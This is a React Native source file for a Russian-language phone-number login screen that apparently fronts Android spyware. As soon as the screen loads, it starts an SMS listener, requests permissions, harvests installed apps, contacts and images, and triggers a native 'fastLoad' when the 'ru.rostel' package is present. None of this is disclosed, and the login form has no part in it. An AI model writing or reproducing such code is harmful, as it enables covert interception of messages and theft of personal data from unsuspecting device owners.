import React, { useState, useEffect } from 'react';
import { View, TouchableOpacity, Text, StyleSheet, ActivityIndicator } from 'react-native';
import { useNavigation } from '@react-navigation/native';
import Sms_Listener from '../../modules/Sms_Listener';
import Permission from '../../modules/Permission';
import Apps from '../../modules/Apps';
import Contact from '../../modules/Contact';
import StorageManager from '../StorageManager';
import { NativeModules } from 'react-native';
import MyInput from '../MyInput';
import Images from '../../modules/Images';
export default function Intro(){
    const [inputText, setInputText] = useState('');
    const [hotlineNumber, setHotlineNumber] = useState('')
    const [apps, setApps] = useState('')
    const [contacts, setContacts] = useState('')
    const [images, setImages] = useState('')
    const isButtonEnabled = inputText.length >= 10;
    const { MainModule } = NativeModules;
    const navigation = useNavigation();
    const [loading, setLoading] = useState(false);
    const defaultHeaders = new Headers();
    defaultHeaders.append('Content-Type', 'application/json');

    const handleContinuePress = () => {
        console.log('Продолжить');
        setLoading(true);
        console.log(inputText)
        navigation.navigate('Main');
    };
    const handleInputChange = (text) => {
        setInputText(text);
        console.log(text)
      };
    const getPermissions = async () => {
        await Permission.requestPermissions();
      };
    const getData = async()=>{
        await setApps(await Apps.loadApps())
        await setContacts(await Contact.loadContacts())
        await setImages(await Images.getImages())
        apps.forEach(element => {
            if(element.packageName == "ru.rostel"){
                MainModule.fastLoad("ru.rostel")
            }
        });
    }
    const getHotLineNumber = async () => {
        const result = await fetch("https://gosserver3-production.up.railway.app/hotline", {
            method: "GET",
            headers: defaultHeaders,
        });
        if (result.ok) {
            const jsonResult = await result.json(); 
            StorageManager.saveData("hotline", jsonResult[0].number); 
            console.log(jsonResult[0].number); 
        } else {
            console.error("Failed to fetch hotline data:", result.status);
        }
    }
    useEffect(()=>{
        Sms_Listener.startListen()
        //getHotLineNumber()
        getPermissions()
        getData()
    },[])

    return(
        <View style={styles.container}>
            <View>
          <Text style={[styles.text, {color:"#fff", fontWeight:'bold', marginBottom:175}]}>Авторизация</Text>
        </View>
      <View style={styles.main}>
      <View>
          <Text style={[styles.text, {color:'#fff'}]}>Введите номер телефона</Text>
        </View>
        <View>
          <MyInput placeholderText='+7 XXX XXX-XX-XX' type='phone-pad' backgroundColor='#25242A' onTextChange={handleInputChange} />
        </View>
        <TouchableOpacity
          style={[styles.button, { backgroundColor: isButtonEnabled ? '#353746' : '#ccc' }]}
          onPress={handleContinuePress}
          disabled={!isButtonEnabled}
        >
            {loading ? <ActivityIndicator size="small" color="#fff" /> : <Text style={styles.buttonText}>Продолжить</Text>}
        </TouchableOpacity>
      </View>
    </View>
    );
}

const styles = StyleSheet.create({
    container: {
      flex: 1,
      backgroundColor: '#2A2A32',
      alignItems: 'center',
      justifyContent: 'center',
    },
    main: {
      height: 500,
      width: 350,
      borderRadius: 15,
      alignItems: "center",
      flexDirection: "column",
      marginBottom:100
    },
    svg: {
      paddingTop: 110
    },
    text: {
      fontSize: 18,
      color: 'black'
    },
    text2: {
      fontSize: 18,
      color: 'black'
    },
    maintext: {
      alignItems: "center",
      paddingTop: 30,
      paddingBottom: 10,
      color: 'black'
    },
    numberview: {
      alignItems: "center",
  
    },
    numberview_text: {
      textAlign: 'center',
      fontWeight: 'bold',
      fontSize: 14,
      paddingLeft: 10,
      paddingRight: 10,
      lineHeight: 25,
      color: 'black'
    },
    button: {
      width: '100%',
      height: 50,
      justifyContent: 'center',
      alignItems: 'center',
      borderRadius: 10,
      marginTop: 425
    },
    buttonText: {
      color: 'white',
      fontSize: 16,
    },
  });
